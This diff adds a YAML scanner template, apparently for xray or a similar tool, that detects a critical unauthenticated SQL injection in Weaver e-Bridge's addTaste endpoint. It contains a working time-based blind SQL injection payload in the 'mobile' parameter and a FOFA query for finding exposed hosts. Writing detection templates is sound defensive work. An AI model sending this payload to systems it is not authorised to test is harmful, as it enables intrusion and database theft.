@@ -1,0 +1,54 @@
+id: weaver-ebridge-addTasteJsonp-sqli
+info:
+  name: Weaver e-Bridge addTasteJsonp SQL Injection
+  author: ZacharyZcR
+  severity: critical
+  verified: true
+  description: |
+    Weaver e-Bridge system addTasteJsonp interface exists SQL injection vulnerability.
+    Unauthenticated attackers can exploit SQL injection vulnerabilities to obtain information in the database.
+    FOFA: app="泛微云桥e-Bridge"
+  reference:
+    - https://mp.weixin.qq.com/s/Ej26hywx4po4sj3dSAVI_Q
+  tags: ecology,ebridge,sqli
+  created: 2024/12/30
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27+AND+%28SELECT+8094+FROM+%28SELECT%28SLEEP%2810-%28IF%2818015%3E3469%2C0%2C4%29%29%29%29%29mKjk%29+OR+%27KQZm%27%3D%27REcX
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"msg":') &&
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r1:
+    request:
+      method: GET
+      path: /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27+AND+%28SELECT+8094+FROM+%28SELECT%28SLEEP%286-%28IF%2818015%3E3469%2C0%2C4%29%29%29%29%29mKjk%29+OR+%27KQZm%27%3D%27REcX
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"msg":') &&
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+  r2:
+    request:
+      method: GET
+      path: /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27+AND+%28SELECT+8094+FROM+%28SELECT%28SLEEP%2810-%28IF%2818015%3E3469%2C0%2C4%29%29%29%29%29mKjk%29+OR+%27KQZm%27%3D%27REcX
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"msg":') &&
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r3:
+    request:
+      method: GET
+      path: /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27+AND+%28SELECT+8094+FROM+%28SELECT%28SLEEP%286-%28IF%2818015%3E3469%2C0%2C4%29%29%29%29%29mKjk%29+OR+%27KQZm%27%3D%27REcX
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"msg":') &&
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+
+expression: r0() && r1() && r2() && r3()
